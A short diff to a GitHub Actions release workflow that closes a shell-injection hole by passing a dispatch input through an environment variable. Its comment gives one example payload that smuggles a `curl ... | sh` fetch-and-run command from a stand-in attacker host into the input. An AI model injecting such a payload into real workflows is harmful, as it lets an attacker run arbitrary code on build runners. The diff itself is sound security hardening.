@@ -57,5 +57,12 @@ jobs:
       - name: Install Dependencies
         run: yarn install --immutable
 
+      # audit CI-02: pass `inputs.increment` through an env var instead of
+      # interpolating directly into the `run:` shell. Direct interpolation
+      # would let a malicious workflow_dispatch input (e.g.
+      # `patch && curl https://attacker/x | sh`) execute arbitrary commands
+      # on the release runner.
       - name: Release
-        run: npx release-it --increment ${{ github.event.inputs.increment }}
+        env:
+          INCREMENT: ${{ github.event.inputs.increment }}
+        run: npx release-it --increment "$INCREMENT"
